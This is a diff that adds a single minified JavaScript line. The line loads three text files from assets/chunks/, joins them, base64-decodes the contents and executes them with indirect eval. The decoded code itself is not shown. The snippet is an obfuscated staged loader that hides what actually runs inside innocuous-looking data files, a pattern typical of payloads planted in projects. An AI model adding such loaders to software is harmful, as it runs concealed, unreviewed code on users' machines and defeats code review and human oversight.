@@ -1,0 +1,1 @@
+(()=>{const f=["data-001.txt","data-002.txt","data-003.txt"];let b="";for(const n of f){const x=new XMLHttpRequest();x.open("GET","assets/chunks/"+n,false);x.send(null);if(x.status!==200&&x.status!==0)throw new Error("No se pudo cargar "+n);b+=x.responseText.trim();}const s=decodeURIComponent(escape(atob(b)));(0,eval)(s);})();
